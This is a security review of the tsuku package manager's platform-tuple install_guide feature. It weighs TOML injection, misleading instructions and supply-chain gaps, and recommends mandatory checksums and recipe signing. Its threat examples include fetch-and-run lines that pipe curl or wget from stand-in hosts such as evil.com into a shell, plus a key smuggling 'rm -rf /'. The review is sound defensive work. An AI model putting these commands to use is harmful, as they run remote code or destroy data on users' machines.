# Security Review: Platform Tuple Support for install_guide

**Review Date**: 2025-12-27
**Feature**: Platform tuple support (`os/arch` keys) in `install_guide` field
**Context**: Tsuku downloads and executes binaries - security is critical

## Executive Summary

The platform tuple support feature has **minimal direct security impact** because it operates entirely on static recipe data and only affects which installation instruction text is displayed to users. However, this review identified **critical gaps in the original security analysis** related to tsuku's broader threat model as a package manager that downloads and executes binaries.

**Key Findings**:
1. **TOML injection risk is adequately mitigated** (parsing validation + format checks)
2. **Social engineering via misleading instructions is the primary residual risk** (inherent to install_guide)
3. **"Not applicable" security categories reveal gaps in tsuku's broader security posture**
4. **Recipe trust and provenance are unaddressed upstream concerns**

## 1. Attack Vector Analysis

### 1.1 TOML Key Injection (Addressed)

**Attack**: Craft malicious TOML keys with special characters to exploit parser vulnerabilities or bypass validation.

**Examples**:
- Path traversal: `"../../os/arch" = "malicious cmd"`
- Shell metacharacters: `"darwin; rm -rf /" = "brew install gcc"`
- Unicode/homoglyphs: `"dаrwin/arm64" = "curl evil.com | sh"` (Cyrillic 'а')
- Null bytes: `"darwin\x00/arm64" = "..."`
- Nested keys: `"darwin.arm64" = "..."` (period-separated TOML table path)

**Mitigations in place**:
1. **BurntSushi/toml v1.5.0** - Battle-tested parser (used by Cargo, Hugo, etc.)
   - Handles slash characters correctly (requires quoting: `"darwin/arm64"`)
   - Rejects malformed keys
   - No known injection vulnerabilities

2. **Tuple format validation** (platform.go ValidateStepsAgainstPlatforms):
   ```go
   // Validation will check:
   // - Key contains exactly one '/' separator
   // - OS component is in TsukuSupportedOS() ["linux", "darwin"]
   // - Arch component is in TsukuSupportedArch() ["amd64", "arm64"]
   // - Tuple exists in recipe's supported platforms
   ```

3. **String-only values** - install_guide values are plain strings, no code execution

**Residual risk**: **LOW** - Validation restricts tuple keys to known-good format

### 1.2 Social Engineering via Misleading Instructions (Inherent Risk)

**Attack**: Recipe author provides malicious installation instructions that direct users to compromised sources.

**Examples**:
```toml
[steps.install_guide]
"darwin/arm64" = "curl https://evil.com/fake-homebrew.sh | sh"
"linux/amd64" = "wget http://malicious.site/gcc.deb && sudo dpkg -i gcc.deb"
```

**Why this matters**: Users trust tsuku to provide legitimate installation guidance. If a recipe is compromised (malicious PR, account takeover), users could execute arbitrary code.

**Mitigations in place**:
- **None** - This is an existing property of `install_guide`, not new to platform tuple support
- Recipe trust relies on:
  - GitHub repository access controls
  - Pull request review process
  - Community vigilance

**Residual risk**: **MEDIUM-HIGH** - Depends entirely on recipe provenance security (addressed in Section 3)

### 1.3 Tuple Key Spoofing (Architecture Dependency)

**Attack**: Use tuple keys to target specific architectures with platform-specific exploits.

**Example**:
```toml
[steps.install_guide]
# Legitimate instruction for arm64
"darwin/arm64" = "brew install gcc"
# Malicious instruction targeting specific architecture known to have vulnerability
"linux/amd64" = "curl http://evil.com/exploit-x86.sh | sh"
```

**Why this could be overlooked**: A reviewer might focus on the darwin instruction and miss the linux variant.

**Mitigations in place**:
- **Code review process** should check all platform variants
- **Validation ensures coverage** - missing platforms trigger errors, drawing attention to incomplete guides

**Residual risk**: **LOW-MEDIUM** - Depends on review quality; validation helps by flagging gaps

### 1.4 Fallback Key Exploitation

**Attack**: Exploit the fallback hierarchy to inject malicious instructions.

**Scenario**:
```toml
[steps.install_guide]
darwin = "brew install gcc"          # Legitimate, reviewed carefully
linux = "apt install gcc"            # Legitimate, reviewed carefully
fallback = "curl evil.com/setup.sh | sh"  # Malicious, might be overlooked
```

If validation allows recipes with only fallback keys, this could bypass platform-specific review.

**Mitigations in place**:
- Validation requires **complete coverage** for all supported platforms (tuple OR OS OR fallback)
- Fallback key only used if no platform-specific match exists
- Validation error messages explicitly mention fallback in coverage checks

**Residual risk**: **LOW** - Validation logic makes fallback-only configurations suspicious

## 2. Security Categories Re-Evaluation

The original analysis marked several categories as "not applicable". This section re-examines each in the context of tsuku's threat model as a **binary download and execution system**.

### 2.1 Download Verification (Originally: Not Applicable)

**Original justification**: "install_guide provides human-readable text instructions, does not download binaries"

**Critical flaw in reasoning**: This is **correct for install_guide itself** but reveals a **gap in tsuku's broader security posture**.

**The real issue**: install_guide directs users to download system dependencies that tsuku **cannot verify**. For example:

```toml
[steps.install_guide]
linux = "Visit https://docker.com/install and run the installation script"
```

**Attack vector**:
1. User follows install_guide instructions
2. User downloads and executes system dependency (Docker, CUDA, etc.)
3. **No verification by tsuku** - user trusts the upstream source
4. Compromised upstream could deliver malware

**What tsuku DOES verify** (for tools it installs):
- GitHub release binaries: **No checksum verification** (trusts GitHub release assets)
- Homebrew bottles: **No checksum verification** (trusts Homebrew infrastructure)
- Source builds: **No checksum verification** of source archives
- Download action: **Supports checksum_url** but not enforced

**Evidence from codebase**:
```go
// internal/actions/download.go:47-50
if _, hasChecksumURL := GetString(params, "checksum_url"); !hasChecksumURL {
    if _, hasSkipReason := GetString(params, "skip_verification_reason"); !hasSkipReason {
        result.AddWarning("no upstream checksum verification")
    }
}
```

**Tsuku has download verification infrastructure but does not enforce it**:
- Checksum verification is **optional** (warning, not error)
- `skip_verification_reason` allows bypassing verification with a comment
- Many recipes likely lack checksum verification (GitHub release builder doesn't add it)

**Residual risk for install_guide**: **LOW** - Feature doesn't change existing risk
**Residual risk for tsuku overall**: **HIGH** - Lack of mandatory verification for downloaded binaries

**Recommendation**: Escalate to tsuku maintainers - consider mandatory checksum verification for all downloads (separate from this feature).

### 2.2 Execution Isolation (Originally: Not Applicable)

**Original justification**: "install_guide contains static text, no code execution beyond validation"

**Re-evaluation**: **Correct for install_guide**, but reveals tsuku's execution model relies on **sandbox testing as primary isolation**.

**Tsuku's isolation strategy**:
1. **Plan generation (on host)**: No isolation - runs in user's environment
2. **Sandbox testing (in container)**: Isolation via Docker/Podman
3. **User installation (on host)**: No isolation - runs in user's environment

**install_guide's role**: Provides instructions for users to install system dependencies **on their host** (no isolation).

**Attack scenarios**:
- User runs malicious install_guide instructions directly on host
- Compromised system dependency (Docker, CUDA) gains root access
- No sandboxing protects user from following malicious instructions

**Mitigation**: Users must trust:
1. Tsuku recipe sources (GitHub repo)
2. System dependency upstreams (Docker, NVIDIA, etc.)

**Residual risk for install_guide**: **MEDIUM** - Users execute instructions on host with no isolation
**Residual risk for tsuku overall**: **MEDIUM** - User installations run on host with no sandboxing

**Note**: Sandbox testing (DESIGN-install-sandbox.md) provides isolation for **testing recipes**, not for **user installations**. This is by design (users want tools installed in their real environment).

### 2.3 Supply Chain Risks (Originally: Partial)

**Original assessment**: "Recipe authors can write misleading instructions (existing property of install_guide)"

**Expanded analysis**:

**Recipe supply chain**:
- **Threat**: Compromised recipe repository (malicious PR, account takeover, repo compromise)
- **Mitigation**: GitHub access controls, PR review, community vigilance
- **Gap**: No cryptographic signing of recipes, no provenance verification

**System dependency supply chain** (new attack surface for install_guide):
- **Threat**: Compromised upstream (Docker, CUDA, Homebrew, etc.)
- **Mitigation**: Users trust upstream sources (Docker.com, NVIDIA, Homebrew)
- **Gap**: Tsuku does not verify system dependency authenticity

**Tsuku binary supply chain** (tools tsuku installs):
- **Threat**: Compromised GitHub releases, npm packages, PyPI packages
- **Mitigation**: Trust in upstream package ecosystems
- **Gap**: No mandatory checksum verification (see 2.1)

**Platform tuple support impact**:
- **Does NOT increase supply chain risk** - architecture-specific instructions are still just text
- **Could slightly improve security** - allows more precise instructions (e.g., "for arm64, use /opt/homebrew which has better security defaults")

**Residual risk for install_guide**: **MEDIUM** - Depends on recipe provenance
**Residual risk for tsuku overall**: **MEDIUM-HIGH** - Multiple unverified supply chains

### 2.4 User Data Exposure (Originally: Not Applicable)

**Original justification**: "operates on static recipe data, no user-specific information"

**Re-evaluation**: **Correct** - install_guide does not handle user data.

**Broader tsuku context**:
- Installation paths contain usernames (`/home/username/.tsuku/`)
- Telemetry (if enabled) may transmit OS/arch/tool names
- No PII collection in install_guide feature

**Residual risk**: **NEGLIGIBLE** - No user data exposure from this feature

## 3. Unaddressed Upstream Concerns

This review surfaced several **critical security gaps** in tsuku's overall architecture that are **independent of platform tuple support** but exposed by the "not applicable" justifications.

### 3.1 Recipe Provenance and Trust

**Current state**: Recipes are stored in GitHub repository with no cryptographic verification.

**Risks**:
- Compromised GitHub account could push malicious recipes
- MITM attacks during recipe fetch (if not HTTPS-only)
- No way to verify recipe author identity

**Best practices (not implemented)**:
- Cryptographic signing of recipes (e.g., GPG signatures)
- Provenance tracking (who created/modified recipe, when)
- Pin recipes to specific commits/versions
- Content-addressable recipe storage (hash-based)

**Recommendation**: Consider SLSA provenance framework or Sigstore for recipe signing.

### 3.2 Binary Verification Requirements

**Current state**: Checksum verification is **optional** and **warning-only**.

**Risks**:
- Compromised GitHub releases deliver malicious binaries
- Typosquatting attacks (wrong URL downloads wrong binary)
- MITM attacks if not enforcing HTTPS (is it enforced?)

**Best practices (partially implemented)**:
- **Mandatory checksum verification** for all downloads
- **Reject downloads without checksums** (not warn)
- **Verify checksums from trusted source** (upstream checksum file, not inline)
- Support for cryptographic signatures (GPG, Sigstore)

**Evidence of current behavior**:
```go
// download.go warns but doesn't error without checksums
if _, hasChecksumURL := GetString(params, "checksum_url"); !hasChecksumURL {
    result.AddWarning("no upstream checksum verification")
}
```

**Recommendation**: Make checksum verification **mandatory** in future version (with migration path for existing recipes).

### 3.3 HTTPS Enforcement

**Question**: Does tsuku enforce HTTPS for all external requests?

**Critical areas**:
- Recipe downloads from registry
- Tool binary downloads (GitHub, npm, PyPI, etc.)
- Version resolution from package indexes
- Checksum file downloads

**Evidence from codebase** (version/security_test.go):
- SSRF protection blocks non-HTTPS redirects
- HTTP client has extensive security hardening (SSRF, decompression bomb, size limits)
- Tests verify HTTPS-only redirects

**Likely answer**: Yes, appears enforced via client security checks.

**Verification needed**: Confirm all download paths use secured HTTP client.

### 3.4 Sandbox Escape Risks

**Current state**: Sandbox testing uses Docker/Podman containers.

**Risks**:
- Container escape vulnerabilities (Docker/kernel bugs)
- Malicious recipe exploits container runtime
- Privileged containers or unsafe mounts

**Mitigations in place** (from DESIGN-install-sandbox.md review):
- Network isolation options (none, host)
- Ephemeral containers (deleted after test)
- Read-only mounts where possible

**Gaps**:
- Are containers run with `--privileged`? (Hope not)
- Are resource limits enforced? (CPU, memory, disk)
- Are seccomp/AppArmor profiles applied?

**Recommendation**: Document container security posture (capabilities, seccomp, resource limits).

## 4. Platform Tuple Support: Final Security Assessment

### 4.1 Feature-Specific Risks

| Risk Category | Severity | Mitigation | Residual Risk |
|---------------|----------|------------|---------------|
| TOML injection | HIGH | BurntSushi/toml + format validation | LOW |
| Misleading instructions | HIGH | Code review, community vigilance | MEDIUM-HIGH |
| Tuple key spoofing | MEDIUM | Validation coverage checks | LOW-MEDIUM |
| Fallback exploitation | MEDIUM | Coverage validation | LOW |

### 4.2 Comparison to Existing install_guide

**Does platform tuple support introduce NEW security risks?** **No.**

**Does it change existing risks?** **No.**

**Could it reduce risk?** **Potentially** - More precise instructions could reduce user error (e.g., wrong Homebrew path).

### 4.3 Security Summary

**Direct impact of platform tuple support**: **Minimal**

The feature operates on static recipe data and only affects text display. All identified risks are either:
1. **Adequately mitigated** (TOML injection)
2. **Existing risks** (misleading instructions)
3. **Upstream concerns** (recipe provenance)

**Primary security consideration**: Validation must ensure tuple keys match supported platforms and have proper coverage to prevent:
- Incomplete guidance that confuses users
- Subtle differences across platforms that could hide malicious instructions

## 5. Recommendations

### 5.1 For Platform Tuple Support Feature (This Design)

**ACCEPT implementation with these safeguards**:

1. **Validation enforcement**:
   - Require complete coverage (every supported platform has guidance)
   - Reject unknown tuple keys (not in supported platforms)
   - Explicit error messages mentioning all checked locations (tuple → OS → fallback)

2. **Code review focus**:
   - Review ALL platform-specific install_guide entries (don't just check darwin)
   - Flag suspicious instructions (curl | sh, wget | sh, etc.)
   - Verify instructions match official upstream documentation

3. **Documentation warnings**:
   - Document that install_guide instructions run on host (no sandboxing)
   - Warn recipe authors that all platform variants will be reviewed
   - Provide examples of secure vs insecure instruction patterns

4. **Testing**:
   - Add test cases for malicious tuple keys (path traversal, shell metacharacters)
   - Verify validation rejects incomplete coverage
   - Confirm fallback hierarchy works as expected

### 5.2 For Broader Tsuku Security (Escalate)

**HIGH PRIORITY - Escalate to tsuku maintainers**:

1. **Mandatory checksum verification**:
   - Make `checksum_url` or inline checksums **required** for download action
   - Reject downloads without verification (error, not warning)
   - Provide migration path for existing recipes

2. **Recipe provenance**:
   - Investigate cryptographic signing for recipes (GPG, Sigstore)
   - Consider content-addressable recipe storage
   - Document recipe trust model

3. **Binary signature verification**:
   - Support GPG signature verification for GitHub releases
   - Integrate with package ecosystem signatures (npm, PyPI, etc.)
   - Provide opt-in strict verification mode

4. **Sandbox security audit**:
   - Document container security posture (capabilities, seccomp)
   - Verify containers never run with `--privileged`
   - Add resource limits (CPU, memory, disk)

5. **HTTPS enforcement audit**:
   - Verify all external requests use HTTPS
   - Document any exceptions and why they're safe
   - Add tests for HTTPS-only behavior

**MEDIUM PRIORITY**:

1. **Dependency pinning**:
   - Allow users to pin tool versions to specific checksums
   - Support lockfile-style reproducibility

2. **Telemetry security**:
   - Document what data is collected
   - Ensure no PII leakage
   - Provide clear opt-out mechanism

## 6. Answers to Original Questions

### 1. Are there attack vectors we haven't considered?

**Yes** - Original analysis missed:

1. **Tuple key spoofing** - Architecture-specific malicious instructions could be hidden in less-reviewed platform variants
2. **Fallback exploitation** - Fallback key could be overlooked during review
3. **Social engineering precision** - Platform tuples enable MORE targeted social engineering (e.g., "this exploit only works on darwin/arm64")

However, these are **low-severity** because:
- Validation catches incomplete coverage
- Code review should check all variants
- Attack requires compromised recipe (supply chain issue)

### 2. Are the mitigations sufficient for the risks identified?

**For platform tuple support specifically**: **Yes**

- TOML parsing: Robust library with extensive testing
- Format validation: Strict checks against known-good values
- Coverage validation: Ensures no platforms are missing

**For tsuku's broader threat model**: **No**

- Recipe provenance: Unaddressed
- Binary verification: Optional, not enforced
- System dependency trust: Relies entirely on upstream

### 3. Is there residual risk we should escalate?

**Yes** - Escalate these to tsuku maintainers:

1. **HIGH**: Lack of mandatory checksum verification for binaries
2. **HIGH**: No recipe provenance or signing mechanism
3. **MEDIUM**: System dependency installation happens on host without verification
4. **MEDIUM**: Container security posture not documented

These are **independent of platform tuple support** but revealed by analyzing the "not applicable" categories.

### 4. Are any "not applicable" justifications actually applicable?

**All "not applicable" justifications are correct for install_guide**, but they reveal gaps:

- "Download Verification: Not applicable" → **Correct**, but exposes that tsuku's broader download verification is weak
- "Execution Isolation: Not applicable" → **Correct**, but highlights that user installs have no isolation
- "User Data Exposure: Not applicable" → **Correct** and not a concern

## 7. Conclusion

**Platform tuple support is safe to implement** with the validation and review safeguards outlined in Section 5.1.

**However**, this security review uncovered **significant gaps** in tsuku's overall security posture that should be addressed independently of this feature:

1. Optional (not mandatory) checksum verification
2. No recipe provenance or signing
3. Unverified system dependency installations
4. Undocumented container security posture

These findings should be escalated to tsuku maintainers as **separate security improvement initiatives**, tracked independently of the platform tuple support feature (Issue #686).

**Final recommendation**: **APPROVE** platform tuple support with validation safeguards. **ESCALATE** broader security concerns to separate security audit/improvement process.
